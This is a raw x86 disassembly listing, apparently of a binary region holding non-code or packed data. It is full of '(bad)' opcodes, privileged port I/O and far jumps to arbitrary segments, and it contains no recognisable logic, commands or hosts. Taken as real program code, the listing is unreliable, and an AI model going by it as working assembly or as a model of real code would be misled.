  40d66e:	mov    cl,0xd5
  40d670:	dec    ebx
  40d671:	inc    edi
  40d672:	xor    ecx,DWORD PTR [edi+0x3e]
  40d675:	jmp    FWORD PTR [ebp+0x6a]
  40d678:	mov    cs,WORD PTR [ecx]
  40d67a:	sti    
  40d67b:	sub    BYTE PTR [ecx+eiz*8],al
  40d67e:	mov    edi,0xbe9d42e8
  40d683:	and    al,0xa0
  40d685:	dec    eax
  40d686:	cmp    BYTE PTR es:[edi+0x6a],dh
  40d68a:	pop    edx
  40d68b:	addr16 pop ebx
  40d68d:	sti    
  40d68e:	mov    al,0xac
  40d690:	imul   edi,ebp,0xffffffb1
  40d693:	xor    DWORD PTR [ebp+0x13f578c0],0xbbb529b1
  40d69d:	into   
  40d69e:	jecxz  0x40d6ce
  40d6a0:	stos   BYTE PTR es:[edi],al
  40d6a1:	jl     0x40d6ed
  40d6a3:	arpl   WORD PTR [esi+ebp*1+0x1d],sp
  40d6a7:	inc    esi
  40d6a8:	adc    ebp,ebp
  40d6aa:	jnp    0x40d6a6
  40d6ac:	out    dx,eax
  40d6ad:	jp     0x40d6a5
  40d6af:	dec    esp
  40d6b0:	xchg   DWORD PTR [edi+0x3c61c748],esp
  40d6b6:	mov    dl,BYTE PTR [eax-0x6f6efb8b]
  40d6bc:	ficom  WORD PTR [edi+0x35aba970]
  40d6c2:	and    ebp,ebp
  40d6c4:	lea    edi,[edx-0x4123fdd6]
  40d6ca:	(bad)  
  40d6cb:	mov    bl,0x79
  40d6cd:	in     al,dx
  40d6ce:	jl     0x40d72f
  40d6d0:	dec    esi
  40d6d1:	jl     0x40d738
  40d6d3:	stc    
  40d6d4:	sub    esi,esp
  40d6d6:	mov    BYTE PTR [eax],0x5e
  40d6d9:	push   ebx
  40d6da:	push   esp
  40d6db:	test   BYTE PTR [si],ch
  40d6de:	inc    edi
  40d6df:	and    BYTE PTR [ebp-0x861bede],bl
  40d6e5:	xchg   esp,eax
  40d6e6:	add    eax,0x866d8b
  40d6eb:	es out 0x99,al
  40d6ee:	jbe    0x40d6fc
  40d6f0:	sbb    al,0x90
  40d6f2:	and    DWORD PTR [ecx],ebx
  40d6f4:	cmp    DWORD PTR [esi-0x53],eax
  40d6f7:	or     DWORD PTR [eax],0x286872d1
  40d6fd:	mov    eax,0x17e9d91a
  40d702:	retf   0xdde3
  40d705:	mov    eax,DWORD PTR [ebx]
  40d707:	sbb    edi,DWORD PTR gs:[ebx+0x6f]
  40d70b:	retf   0x519a
  40d70e:	loopne 0x40d6d7
  40d710:	arpl   WORD PTR [edx+0x2],bx
  40d713:	ds dec ebp
  40d715:	int3   
  40d716:	jge    0x40d765
  40d718:	mov    edi,0x2b25472d
  40d71d:	push   eax
  40d71e:	shl    BYTE PTR [edx+0x56aa9641],0xa4
  40d725:	ins    DWORD PTR es:[edi],dx
  40d726:	ds sub al,0x51
  40d729:	and    al,0x9e
  40d72b:	mov    ebp,0x15256635
  40d730:	enter  0x8276,0x73
  40d734:	jo     0x40d7a5
  40d736:	jmp    0x6f0c44ab
  40d73b:	outs   dx,DWORD PTR ds:[esi]
  40d73c:	adc    eax,0x88bb87df
  40d741:	jecxz  0x40d6d7
  40d743:	cmp    DWORD PTR [ebp-0x2adc7256],0xffffffe1
  40d74a:	aam    0x1f
  40d74c:	cli    
  40d74d:	sub    eax,0x3d13fd0a
  40d752:	call   0xf0e6:0x30b0e67c
  40d759:	jmp    0x38bc:0xdd5f16f5
  40d760:	pop    ebp
  40d761:	lahf   
  40d762:	shl    BYTE PTR [ecx],0x6a
  40d765:	int    0x34
  40d767:	in     eax,dx
  40d768:	(bad)  
  40d769:	fdiv   st,st(0)
  40d76b:	mov    ebx,0x8a05b96e
  40d770:	dec    bp
  40d772:	in     al,dx
  40d773:	xor    al,0x38
  40d775:	xchg   edi,eax
  40d776:	push   ss
  40d777:	fist   DWORD PTR [edi+0x6b]
  40d77a:	mov    BYTE PTR [ecx-0x31],0x42
  40d77e:	jne    0x40d743
  40d780:	mov    cl,0xf8
  40d782:	in     eax,0xb
  40d784:	clc    
  40d785:	dec    esp
  40d786:	fwait
  40d787:	call   FWORD PTR [edx-0x9]
  40d78a:	jne    0x40d7d0
  40d78c:	aad    0xfd
  40d78e:	or     al,0xa7
  40d790:	jg     0x40d7a4
  40d792:	cmp    DWORD PTR [ecx],0xffffffcc
  40d795:	adc    edi,eax
  40d797:	push   esp
  40d798:	pop    ss
  40d799:	adc    al,0xf5
  40d79b:	pop    edi
  40d79c:	xchg   ebx,eax
  40d79d:	retf   0x47a9
  40d7a0:	push   edx
  40d7a1:	test   DWORD PTR [eax+0x1f4a8222],0x6f0c0fa9
  40d7ab:	inc    ebp
  40d7ac:	sbb    BYTE PTR [edi],cl
  40d7ae:	adc    DWORD PTR [edx+eax*4-0x1888719a],edi
  40d7b5:	fild   WORD PTR [ebx-0x52]
  40d7b8:	jb     0x40d7b7
  40d7ba:	fnsave [ebp+0x5162f918]
  40d7c0:	adc    al,0xcd
  40d7c2:	inc    esp
  40d7c3:	fdiv   QWORD PTR [ecx+0x1dc78471]
  40d7c9:	aam    0xcb
  40d7cb:	nop
  40d7cc:	shl    DWORD PTR [esi+0x7aba4e5b],1
  40d7d2:	pop    eax
  40d7d3:	rol    BYTE PTR [ecx-0x3b],1
  40d7d6:	mov    ch,0xb6
  40d7d8:	fsub   QWORD PTR [eax-0x5ce19bff]
  40d7de:	jnp    0x40d766
  40d7e0:	rcr    BYTE PTR [ebp+0x1d79d113],0x63
  40d7e7:	sbb    edi,DWORD PTR [eax+0x15bceb18]
  40d7ed:	push   ds
  40d7ee:	xor    ecx,ebx
  40d7f0:	popf   
  40d7f1:	movnti DWORD PTR [ebp+0x33ebe16d],edi
  40d7f8:	(bad)  
  40d7f9:	lea    edi,[esi-0x3e]
  40d7fc:	jmp    0xcb124a90
  40d801:	(bad)  
  40d802:	adc    edi,DWORD PTR [edi+esi*4+0x2d]
  40d806:	into   
  40d807:	sbb    al,0x3f
  40d809:	adc    bl,BYTE PTR [edx]
  40d80b:	adc    al,0x3
  40d80d:	xchg   ebx,eax
  40d80e:	xchg   BYTE PTR ds:0xdd1f4022,cl
  40d814:	retfw  
  40d816:	and    BYTE PTR ss:[ecx-0x7c],al
  40d81a:	hlt    
  40d81b:	inc    ebp
  40d81c:	mov    bl,0x76
  40d81e:	jg     0x40d84d
  40d820:	jae    0x40d7b7
  40d822:	mov    al,ds:0xeaec4b3b
  40d827:	xchg   DWORD PTR [ecx-0x21],esp
  40d82a:	aam    0x67
  40d82c:	adc    ch,al
  40d82e:	loopne 0x40d83a
  40d830:	push   ecx
  40d831:	(bad)  
  40d832:	lea    edi,[ebp+0x57]
  40d835:	(bad)  [edx-0x7dba0a99]
  40d83b:	xor    esp,ebp
  40d83d:	mov    ecx,0x2cc89715
  40d842:	or     al,0x76
  40d844:	mov    cl,0x6c
  40d846:	imul   ebp,esi,0xffffffd0
  40d849:	pop    ds
  40d84a:	nop
  40d84b:	test   esp,eax
  40d84d:	sub    DWORD PTR [esi],0xffffffc0
  40d850:	add    al,0x0
  40d852:	sub    DWORD PTR [edx+0x5af5f0fc],0x62
  40d859:	loop   0x40d8b2
  40d85b:	out    0xa5,eax
  40d85d:	sub    DWORD PTR [ebp+0x37f9160b],ecx
  40d863:	xlat   BYTE PTR ds:[ebx]
  40d864:	mov    ss,WORD PTR [ecx-0x9aa93bc]
  40d86a:	jns    0x40d83f
  40d86c:	fidiv  WORD PTR [edi]
  40d86e:	push   eax
  40d86f:	dec    ebp
  40d870:	add    DWORD PTR [eax+0x5f],esp
  40d873:	xchg   esp,eax
  40d874:	imul   esp,DWORD PTR [edi+0x764cec9a],0xc
  40d87b:	push   ebx
  40d87c:	daa    
  40d87d:	int3   
  40d87e:	add    dl,ch
  40d880:	mov    edx,0x53b355a4
  40d885:	cmc    
  40d886:	inc    ebx
  40d887:	dec    ebx
  40d888:	cmp    al,0xb2
  40d88a:	and    eax,0x67761c74
  40d88f:	sbb    ch,al
  40d891:	repnz cdq 
  40d893:	xor    ecx,DWORD PTR [ebp-0x71]
  40d896:	les    esp,FWORD PTR [eax]
  40d898:	loopne 0x40d8b1
  40d89a:	(bad)  
  40d89b:	jmp    0x3aaf75bd
  40d8a0:	data16 aad 0x7b
  40d8a3:	scas   eax,DWORD PTR es:[edi]
  40d8a4:	ja     0x40d873
  40d8a6:	ret    
  40d8a7:	popf   
  40d8a8:	(bad)  
  40d8a9:	cmp    BYTE PTR [ecx+0x5d0ce174],bh
  40d8af:	shr    BYTE PTR [edx+0x5a],1
  40d8b2:	mov    esi,DWORD PTR [ebx-0x43]
  40d8b5:	jae    0x40d8f7
  40d8b7:	adc    DWORD PTR [ebx+eiz*4+0x1e065a8f],esi
  40d8be:	sbb    eax,DWORD PTR [eax]
  40d8c0:	cdq    
  40d8c1:	test   BYTE PTR [eax+0x2a],0x47
  40d8c5:	das    
  40d8c6:	es in  al,dx
  40d8c8:	jne    0x40d87d
  40d8ca:	add    eax,0x3e75cb4b
  40d8cf:	pop    ebp
  40d8d0:	mov    fs,WORD PTR [ebx]
  40d8d2:	cdq    
  40d8d3:	dec    edi
  40d8d4:	imul   esp,DWORD PTR [ebx+0x19aed3b7],0x62ca0c36
  40d8de:	and    edi,DWORD PTR [edi+0x6]
  40d8e1:	mov    esi,0x32519567
  40d8e6:	call   0x48625344
  40d8eb:	jmp    0x30ac5e17
  40d8f0:	(bad)  
  40d8f1:	push   ss
  40d8f2:	mov    esi,ecx
  40d8f4:	imul   edx,DWORD PTR [ebx],0x27
  40d8f7:	out    0x54,eax
  40d8f9:	push   edi
  40d8fa:	loopne 0x40d959
  40d8fc:	jb     0x40d898
  40d8fe:	sbb    BYTE PTR [edi-0x3e],ah
  40d901:	adc    eax,0x72b0084c
  40d906:	ret    
  40d907:	cmp    DWORD PTR [esi+edi*1-0x318ff51d],ebp
  40d90e:	rol    BYTE PTR [ecx-0x13bc8a3c],1
  40d914:	dec    ecx
  40d915:	sub    al,0xf4
  40d917:	push   edi
  40d918:	mov    dl,0xff
  40d91a:	mov    al,0x12
  40d91c:	sub    dh,al
  40d91e:	in     eax,dx
  40d91f:	jecxz  0x40d92c
  40d921:	mov    ch,0xb8
  40d923:	lods   eax,DWORD PTR ds:[esi]
  40d924:	push   ss
  40d925:	add    BYTE PTR [esi],al
  40d927:	add    al,ch
  40d929:	fisubr DWORD PTR [esi+0x18df4ea9]
  40d92f:	xor    ah,BYTE PTR [edx+ebp*1]
  40d932:	pop    esp
  40d933:	hlt    
  40d934:	jecxz  0x40d920
  40d936:	jl     0x40d921
  40d938:	cli    
  40d939:	inc    edi
  40d93a:	mov    dl,0x96
  40d93c:	add    eax,0x33d85bf2
  40d941:	xlat   BYTE PTR ds:[ebx]
  40d942:	into   
  40d943:	mov    edx,0xf7b77973
  40d948:	dec    ebx
  40d949:	inc    eax
  40d94a:	sbb    al,0x11
  40d94c:	out    dx,al
  40d94d:	stos   BYTE PTR es:[edi],al
  40d94e:	lock pop edx
  40d950:	xor    ch,BYTE PTR [ebx-0x28]
  40d953:	jb     0x40d8dc
  40d955:	test   DWORD PTR [ebx+0x78],eax
  40d958:	retf   0x515c
  40d95b:	mov    edx,0xe65d53f
  40d960:	add    al,BYTE PTR [esi-0x7a]
  40d963:	sbb    BYTE PTR [ebp+0xc05f70a],0x4
  40d96a:	cmc    
  40d96b:	and    eax,DWORD PTR [edx+0x57]
  40d96e:	fbstp  TBYTE PTR [edx]
  40d970:	jbe    0x40d96c
  40d972:	lahf   
  40d973:	mov    WORD PTR ds:0x91871583,ds
  40d979:	daa    
  40d97a:	imul   ebx,DWORD PTR [ebx-0x5478b91c],0x878e1fe0
  40d984:	xor    al,0x1a
  40d986:	in     al,dx
  40d987:	xchg   esp,eax
  40d988:	es xchg ebx,eax
  40d98a:	scas   al,BYTE PTR es:[edi]
  40d98b:	mov    bh,0xc6
  40d98d:	or     BYTE PTR [esp+edi*8+0x1a27d20c],bh
  40d994:	test   al,0xc6
  40d996:	mov    bl,0xf0
  40d998:	fidivr WORD PTR [esi-0x12]
  40d99b:	dec    ebp
  40d99c:	in     al,dx
  40d99d:	ds out dx,al
  40d99f:	xlat   BYTE PTR ds:[ebx]
  40d9a0:	ds xchg esp,eax
  40d9a2:	loope  0x40d939
  40d9a4:	mov    dh,0xe1
  40d9a6:	sub    al,0xbb
  40d9a8:	mov    ah,0x61
  40d9aa:	test   al,0x6e
  40d9ac:	mov    cs,ecx
  40d9ae:	jae    0x40da0e
  40d9b0:	call   0xb925:0x915e0062
  40d9b7:	xor    eax,0x4ebef57b
  40d9bc:	sbb    al,BYTE PTR [eax-0x8]
  40d9bf:	jecxz  0x40d9b0
  40d9c1:	(bad)  
  40d9c2:	es xor eax,0x3c7f79b0
  40d9c8:	jae    0x40d9a8
  40d9ca:	inc    esp
  40d9cb:	aaa    
  40d9cc:	push   ecx
  40d9cd:	sbb    eax,0x90793f99
  40d9d2:	add    DWORD PTR [esi+0xec15603],eax
  40d9d8:	jle    0x40d9c9
  40d9da:	mov    BYTE PTR [esi+0x2a],bh
  40d9dd:	stos   BYTE PTR es:[edi],al
  40d9de:	stc    
  40d9df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9e0:	push   edi
  40d9e1:	out    dx,al
  40d9e2:	inc    ebx
  40d9e3:	pop    edi
  40d9e4:	dec    esi
  40d9e5:	sbb    esp,DWORD PTR [ebx-0x2e]
  40d9e8:	ficom  WORD PTR [ecx-0x46b2633f]
  40d9ee:	dec    ebx
  40d9ef:	imul   esp,edx,0x0
  40d9f2:	stc    
  40d9f3:	jp     0x40da18
  40d9f5:	pop    eax
  40d9f6:	pop    es
  40d9f7:	pop    edx
  40d9f8:	stos   DWORD PTR es:[edi],eax
  40d9f9:	xor    BYTE PTR [eax-0x25580cb1],ah
  40d9ff:	push   edx
  40da00:	sbb    DWORD PTR [ebp-0x36dd0968],ebp
  40da06:	push   edx
  40da07:	push   cs
  40da08:	push   esi
  40da09:	ss (bad) 
  40da0b:	sti    
  40da0c:	or     al,0x52
  40da0e:	mov    ah,0x87
  40da10:	and    ah,BYTE PTR [eax]
  40da12:	scas   al,BYTE PTR es:[edi]
  40da13:	in     eax,dx
  40da14:	loopne 0x40da0e
  40da16:	out    dx,eax
  40da17:	pop    ebp
  40da18:	push   cs
  40da19:	pop    eax
  40da1a:	jbe    0x40da93
  40da1c:	sub    edx,DWORD PTR [ecx]
  40da1e:	adc    cl,BYTE PTR [ebp+0x16]
  40da21:	lea    ecx,[edx-0x67]
  40da24:	mov    ebp,ebp
  40da26:	inc    edx
  40da27:	test   eax,0xa8713a20
  40da2c:	jno    0x40da3b
  40da2e:	mov    esi,0x4b484888
  40da33:	dec    ebp
  40da34:	lea    ebp,[edi]
  40da36:	xchg   bh,ah
  40da38:	nop
  40da39:	or     DWORD PTR [edx-0x5b],eax
  40da3c:	or     dh,bh
  40da3e:	imul   ebx,esi,0x32
  40da41:	mov    bl,0x7c
  40da43:	cs xor eax,0xcf81a293
  40da49:	repnz loopne 0x40da41
  40da4c:	or     DWORD PTR [eax+0x29],eax
  40da4f:	xor    al,0xa
  40da51:	ds shl eax,1
  40da54:	rcl    BYTE PTR [ebx*1+0x27aabc31],1
  40da5b:	xor    al,0x3f
  40da5d:	or     dl,BYTE PTR [ebp+0x4e]
  40da60:	les    ebx,FWORD PTR ds:0x1a1e199f
  40da66:	in     eax,0x6
  40da68:	int3   
  40da69:	in     eax,dx
  40da6a:	call   0xd1bf:0xd548e7ab
  40da71:	sub    eax,0x93171753
  40da76:	xchg   BYTE PTR [ebx-0x3731ccba],ah
  40da7c:	mov    dh,0xf1
  40da7e:	push   edx
  40da7f:	es add bl,dh
  40da82:	add    dh,BYTE PTR [eax-0x7c]
  40da85:	push   ecx
  40da86:	dec    eax
  40da87:	fdiv   DWORD PTR [edi+0x3f]
  40da8a:	xchg   edx,eax
  40da8b:	cmc    
  40da8c:	dec    esi
  40da8d:	mov    bl,0x9
  40da8f:	mov    esi,0x38a81174
  40da94:	hlt    
  40da95:	sbb    eax,0x81387019
  40da9a:	push   0x56
  40da9c:	inc    eax
  40da9d:	inc    edx
  40da9e:	mov    al,0x28
  40daa0:	jo     0x40dafe
  40daa2:	mov    ds:0x93622a7e,eax
  40daa7:	and    al,0xa5
  40daa9:	ret    0x4c14
  40daac:	lds    edi,FWORD PTR [eax+ebp*2+0x8]
  40dab0:	shr    bl,cl
  40dab2:	sbb    al,0xd2
  40dab4:	test   al,0x89
  40dab6:	iret   
  40dab7:	xchg   ecx,eax
  40dab8:	hlt    
  40dab9:	pop    esp
  40daba:	int    0x9e
  40dabc:	jmp    0x1886:0x4eaaf058
  40dac3:	mov    eax,ds:0x6c6fa671
  40dac8:	inc    ebp
  40dac9:	pop    ecx
  40daca:	sbb    BYTE PTR [edi+0x371c0a6f],bl
  40dad0:	ins    BYTE PTR es:[edi],dx
  40dad1:	push   0xffffffbe
  40dad3:	fadd   DWORD PTR [eax]
  40dad5:	jno    0x40dafc
  40dad7:	and    bl,bh
  40dad9:	mov    cl,BYTE PTR [esi-0x4]
  40dadc:	push   0xb6bc81f0
  40dae1:	jmp    0x40daf1
  40dae3:	stc    
  40dae4:	pop    esi
  40dae5:	sub    DWORD PTR ds:0x29c30d11,edx
  40daeb:	jb     0x40dae8
  40daed:	nop
  40daee:	mov    bl,0x61
  40daf0:	lahf   
  40daf1:	fidiv  DWORD PTR [ebx]
  40daf3:	cli    
  40daf4:	jns    0x40da88
  40daf6:	mov    WORD PTR [eax],fs
  40daf8:	outs   dx,DWORD PTR ds:[esi]
  40daf9:	push   ds
  40dafa:	inc    esi
  40dafb:	or     al,0x5b
  40dafd:	xor    eax,0x6b47e3dd
  40db02:	adc    eax,0xd2f63b43
  40db07:	mov    ch,0xea
  40db09:	jb     0x40db0c
  40db0b:	pop    esp
  40db0c:	xchg   edx,eax
  40db0d:	xchg   esi,eax
  40db0e:	nop
  40db0f:	mov    dh,0x97
  40db11:	outs   dx,DWORD PTR ds:[esi]
  40db12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db13:	xor    edi,DWORD PTR [edi-0x49df21ca]
  40db19:	or     edx,ebx
  40db1b:	mov    bl,0x68
  40db1d:	dec    ebp
  40db1e:	iret   
  40db1f:	cmp    edi,DWORD PTR [ebp+0x8708a77]
  40db25:	int3   
  40db26:	jmp    0x40db88
  40db28:	cli    
  40db29:	sahf   
  40db2a:	bnd jo 0x40dba1
  40db2d:	dec    esp
  40db2e:	push   eax
  40db2f:	fcom   QWORD PTR [edi+0x1a84e1d0]
  40db35:	inc    esi
  40db36:	xor    DWORD PTR [edi-0x71],edi
  40db39:	retf   
  40db3a:	iret   
  40db3b:	fs nop
  40db3d:	dec    esp
  40db3e:	xchg   esi,eax
  40db3f:	mov    ss,WORD PTR [eax+0x7074fea9]
  40db45:	dec    ebx
  40db46:	cmp    BYTE PTR [eax+ebp*1],0x98
  40db4a:	call   0xea436592
  40db4f:	jle    0x40daf4
  40db51:	inc    BYTE PTR [eax*1+0x16b85447]
  40db58:	sbb    bh,BYTE PTR [ebx+0x341fc7f6]
  40db5e:	repnz pop edi
  40db60:	aad    0x44
  40db62:	sub    eax,0x64d967d5
  40db67:	test   BYTE PTR [edx-0x384a64cb],0x45
  40db6e:	or     eax,esi
  40db70:	repz fldcw WORD PTR [edi+0x1962dee0]
  40db77:	or     al,0x2d
  40db79:	inc    esp
  40db7a:	enter  0xd16,0xd6
  40db7e:	mov    ah,0xd
  40db80:	ficom  WORD PTR ds:0xddeaf2bf
  40db86:	clc    
  40db87:	stos   DWORD PTR es:[edi],eax
  40db88:	or     al,al
  40db8a:	shl    cl,0xd6
  40db8d:	(bad)  
  40db8f:	or     BYTE PTR [ebx+0x34],ch
  40db92:	add    BYTE PTR [ecx],dl
  40db94:	fs nop
  40db96:	xor    al,cl
  40db98:	out    0x91,eax
  40db9a:	jmp    0x4bc:0xe32a306c
  40dba1:	mov    eax,ds:0xde82fd0b
  40dba6:	cmp    esp,DWORD PTR ds:0x20179a83
  40dbac:	test   eax,0xbb397c0f
  40dbb1:	in     al,dx
  40dbb2:	inc    ebx
  40dbb3:	add    bl,BYTE PTR [ecx+ecx*4+0x77c3815e]
  40dbba:	push   eax
  40dbbb:	retf   0x5df0
  40dbbe:	mov    BYTE PTR [ecx+0x34],ah
  40dbc1:	sub    bh,bh
  40dbc3:	jne    0x40dc38
  40dbc5:	xchg   edi,eax
  40dbc6:	dec    esp
  40dbc7:	lods   al,BYTE PTR ds:[esi]
  40dbc8:	mov    ah,0x83
  40dbca:	ja     0x40dba6
  40dbcc:	xor    ecx,ebx
  40dbce:	addr16 and cl,cl
  40dbd1:	test   eax,0xefa9df2e
  40dbd6:	mov    ds:0x7d70c058,eax
  40dbdb:	fadd   st,st(6)
  40dbdd:	xchg   ebx,eax
  40dbde:	mov    dh,dh
  40dbe0:	pop    ebp
  40dbe1:	icebp  
  40dbe2:	imul   ebp,DWORD PTR [edx+ebp*1-0x3c],0x6c
  40dbe7:	inc    DWORD PTR [eax-0x1ae0b15f]
  40dbed:	adc    BYTE PTR [ecx+0x7],bl
  40dbf0:	in     eax,dx
  40dbf1:	aaa    
  40dbf2:	aas    
  40dbf3:	push   edx
  40dbf4:	xor    ch,BYTE PTR [ecx+0x75b37]
  40dbfa:	rol    BYTE PTR ds:0x2c6e9a07,0x2b
  40dc01:	and    al,0xae
  40dc03:	and    eax,0x3af4a3d8
  40dc08:	js     0x40dc5e
  40dc0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc0b:	push   ebp
  40dc0c:	js     0x40dbfb
  40dc0e:	mov    DWORD PTR ds:0xede75e56,edx
  40dc14:	popa   
  40dc15:	push   eax
  40dc16:	lds    edi,FWORD PTR [ebp+ebp*4-0x3a]
  40dc1a:	cs push es
  40dc1c:	cs push 0xe32bee2b
  40dc22:	dec    ebx
  40dc23:	stc    
  40dc24:	cmp    BYTE PTR [ebp+0x57],ch
  40dc27:	pop    ecx
  40dc28:	mov    DWORD PTR [edx+ebx*1],eax
  40dc2b:	mov    ?,WORD PTR [edi+0x72]
  40dc2e:	xor    al,0x3c
  40dc30:	dec    BYTE PTR [edi-0x37]
  40dc33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc34:	sub    al,BYTE PTR [ebx]
  40dc36:	stc    
  40dc37:	les    esi,FWORD PTR [eax-0x53]
  40dc3a:	lahf   
  40dc3b:	mov    al,0x77
  40dc3d:	fnstsw WORD PTR [ecx]
  40dc3f:	pop    es
  40dc40:	mov    ?,WORD PTR [ecx+0xab5f929]
  40dc46:	mov    edi,0x7b5c61
  40dc4b:	daa    
  40dc4c:	inc    ebp
  40dc4d:	pop    ss
  40dc4e:	enter  0x36ea,0xda
  40dc52:	and    DWORD PTR [ebx+esi*2+0x63],esp
  40dc56:	xor    eax,0x3ee937cf
  40dc5b:	mov    WORD PTR [ebx+0x19],gs
  40dc5e:	lahf   
  40dc5f:	pusha  
  40dc60:	xlat   BYTE PTR ds:[ebx]
  40dc61:	jns    0x40dc01
  40dc63:	das    
  40dc64:	or     DWORD PTR [ebx+0x7beabc8d],eax
  40dc6a:	xchg   BYTE PTR [ebx+0x5b3b9df6],dl
  40dc70:	pusha  
  40dc71:	stos   BYTE PTR es:[edi],al
  40dc72:	and    eax,0xc3fe2dec
  40dc77:	jne    0x40dc99
  40dc79:	mov    edx,0xe88e026e
  40dc7e:	sub    BYTE PTR [edx],dh
  40dc80:	sbb    al,0xc6
  40dc82:	(bad)  
  40dc83:	imul   edx
  40dc85:	stos   DWORD PTR es:[edi],eax
  40dc86:	pavgb  mm3,QWORD PTR [edi-0x69ee05b7]
  40dc8d:	inc    esi
  40dc8e:	stc    
  40dc8f:	aad    0xed
  40dc91:	out    0x42,eax
  40dc93:	sbb    edx,DWORD PTR [eax+0xd]
  40dc96:	lds    esi,FWORD PTR [esi]
  40dc98:	pop    ecx
  40dc99:	cmp    DWORD PTR [eax-0x7f],edx
  40dc9c:	sbb    al,0x9a
  40dc9e:	ja     0x40dcd1
  40dca0:	out    0x68,al
  40dca2:	rol    BYTE PTR ds:0x7a9c79c3,cl
  40dca8:	aam    0xc0
  40dcaa:	retf   0x20b2
  40dcad:	cdq    
  40dcae:	icebp  
  40dcaf:	into   
  40dcb0:	sub    BYTE PTR [eax+0x4e],dh
  40dcb3:	xchg   edx,eax
  40dcb4:	cmp    eax,0xa0d6948b
  40dcb9:	gs nop
  40dcbb:	push   esi
  40dcbc:	mov    bh,0x8a
  40dcbe:	mov    al,ds:0x4d83c52d
  40dcc3:	data16 (bad) 
  40dcc5:	das    
  40dcc6:	cmp    al,0xd8
  40dcc8:	dec    ebp
  40dcc9:	stos   DWORD PTR es:[edi],eax
  40dcca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dccb:	in     al,dx
  40dccc:	cmp    BYTE PTR [esp+edx*2-0x39],0xc3
  40dcd1:	test   BYTE PTR [ebx],ah
  40dcd3:	adc    BYTE PTR [eax+0x11],dh
  40dcd6:	sub    al,0x3c
  40dcd8:	loope  0x40dcd8
  40dcda:	pushf  
  40dcdb:	int3   
  40dcdc:	icebp  
  40dcdd:	jnp    0x40dcea
  40dcdf:	aad    0x1a
  40dce1:	aas    
  40dce2:	aad    0x6f
  40dce4:	cdq    
  40dce5:	xor    edi,DWORD PTR [ebx]
  40dce7:	inc    ebp
  40dce8:	jmp    0xdc2a:0xfff8f73e
  40dcef:	shl    DWORD PTR [ebp+0x11dd7574],0x3a
  40dcf6:	fwait
  40dcf7:	pop    eax
  40dcf8:	rcl    DWORD PTR [edi+edx*4],0xdc
  40dcfc:	adc    bh,bh
  40dcfe:	push   ecx
  40dcff:	je     0x40dccc
  40dd01:	xchg   DWORD PTR [eax+ebx*2-0x67a91c8d],eax
  40dd08:	clc    
  40dd09:	xor    al,0xe
  40dd0b:	or     DWORD PTR [esi+0x4dabe684],0x4d849c52
  40dd15:	je     0x40dd46
  40dd17:	mov    al,ds:0xc987eb07
  40dd1c:	dec    ebp
  40dd1d:	outs   dx,BYTE PTR ds:[esi]
  40dd1e:	outs   dx,DWORD PTR ds:[esi]
  40dd1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd20:	loope  0x40dcad
  40dd22:	sub    DWORD PTR [ebx-0x2f],edx
  40dd25:	dec    edi
  40dd26:	mov    ebx,0x8714b08
  40dd2b:	inc    ebx
  40dd2c:	je     0x40dcdb
  40dd2e:	cmp    eax,0xae22524d
  40dd33:	test   DWORD PTR [esi],edx
  40dd35:	fisttp DWORD PTR [ebp+0x45]
  40dd38:	dec    esp
  40dd39:	or     dl,0xcb
  40dd3c:	mov    bh,0x91
  40dd3e:	(bad)  
  40dd3f:	jle    0x40dd4e
  40dd41:	push   ebp
  40dd42:	frstor [esi-0x4d5426ad]
  40dd48:	aad    0xef
  40dd4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd4b:	inc    eax
  40dd4c:	mov    esi,0xb0ee2202
  40dd51:	cdq    
  40dd52:	loop   0x40dd65
  40dd54:	xchg   esi,eax
  40dd55:	mov    ecx,0x3beee5ba
  40dd5a:	test   BYTE PTR [ebx],dh
  40dd5c:	hlt    
  40dd5d:	add    DWORD PTR [ebx-0x78],esp
  40dd60:	xchg   BYTE PTR [eax+0x98db2de],dl
  40dd66:	outs   dx,BYTE PTR ds:[esi]
  40dd67:	mov    bl,0xbc
  40dd69:	iret   
  40dd6a:	in     eax,0xce
  40dd6c:	loop   0x40dd34
  40dd6e:	daa    
  40dd6f:	push   ss
  40dd70:	(bad)  
  40dd71:	rcl    DWORD PTR [esi-0x219b4a76],1
  40dd77:	sbb    eax,0xc49c9994
  40dd7c:	mov    bh,0x31
  40dd7e:	data16 add dl,bl
  40dd81:	aad    0xdc
  40dd83:	jmp    0x39fa6a67
  40dd88:	add    BYTE PTR [edx],bl
  40dd8a:	ins    BYTE PTR es:[edi],dx
  40dd8b:	jne    0x40dd6e
  40dd8d:	mov    esi,0xd277e64a
  40dd92:	or     ah,bh
  40dd94:	cmp    BYTE PTR [edx+ebx*2],bl
  40dd97:	jo     0x40dd98
  40dd99:	push   edi
  40dd9a:	repnz cmp al,0xb5
  40dd9d:	cmp    bl,BYTE PTR [ecx-0xe]
  40dda0:	sar    al,cl
  40dda2:	mov    ds:0xf372f710,al
  40dda7:	lods   al,BYTE PTR ds:[esi]
  40dda8:	jno    0x40dd41
  40ddaa:	and    eax,0x776f92e6
  40ddaf:	retf   
  40ddb0:	fisubr DWORD PTR [ebp+0x1]
  40ddb3:	mov    dl,0xf4
  40ddb5:	nop
  40ddb6:	push   ss
  40ddb7:	scas   al,BYTE PTR es:[edi]
  40ddb8:	cwde   
  40ddb9:	add    al,0xb6
  40ddbb:	in     al,dx
  40ddbc:	cmc    
  40ddbd:	loopne 0x40dda9
  40ddbf:	mov    bh,0x43
  40ddc1:	ds fs push 0x8706db03
  40ddc8:	add    eax,0xe0e208aa
  40ddcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddce:	jmp    0x53ae:0xd74c7dc0
  40ddd5:	(bad)  
  40ddd6:	ss add ch,dh
  40ddd9:	xor    al,0x1d
  40dddb:	adc    eax,0x1254179c
  40dde0:	sbb    eax,DWORD PTR es:[edx+ecx*8+0x1cbee42d]
  40dde8:	nop
  40dde9:	sbb    ebp,DWORD PTR [edx]
  40ddeb:	fwait
  40ddec:	js     0x40dde1
  40ddee:	adc    ebx,DWORD PTR [edx+ebp*4-0x9e29f54]
  40ddf5:	ror    cl,cl
  40ddf7:	cmp    esi,DWORD PTR [eax-0x724a0ba2]
